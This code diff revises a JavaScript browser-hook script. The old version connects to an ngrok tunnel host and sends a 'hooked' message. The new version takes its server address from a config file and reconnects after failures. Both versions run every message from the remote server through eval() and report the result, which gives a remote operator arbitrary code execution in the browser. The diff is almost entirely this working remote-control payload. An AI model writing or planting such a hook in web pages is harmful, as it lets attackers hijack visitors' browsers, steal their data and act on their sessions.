@@ -1,24 +1,42 @@
-<script>
-      const ws = new WebSocket("ws://e2b1-2a0d-5600-19-27-00-12.ngrok-free.app/");
+let config;
 
-      ws.onopen = () => {
-        console.log("connected");
-        ws.send(JSON.stringify({ type: "hooked" }));
-      };
+async function connect() { 
+  try{
+    const file = await fetch("websocket_config.json", { 
+      cache: "no-store"});
+      config = await file.json()
 
-      ws.onmessage = (event) => {
+  } catch (error) {
+    setTimeout(connect, 3000);
+    return;
+  }
+      
+    ws = new WebSocket(config.websocket_url);
+
+
+    ws.onopen = () => {
+      console.log("Connected");
+    };
+
+    ws.onmessage = (event) => {
         const data = event.data;
-        eval(data);
-        ws.send("Script ran")
 
-      };
+        try {
+            eval(data);
+            ws.send("Browser: Javascript ran");
+        } catch (error) {
+          if (data == ""){
+            ws.send("")
+          } else {
+              ws.send("Browser: error running: "+data);
+          }
+        }
+    };
 
-      ws.onerror = (error) => {
-        console.error("WebSocket error:", error);
-      };
-
-      ws.onclose = (event) => {
+    ws.onclose = (event) => {
         console.log(`Closed: ${event.code} ${event.reason}`);
-      };
-</script>
+        setTimeout(connect, 3000);
+    };
+}
 
+connect();
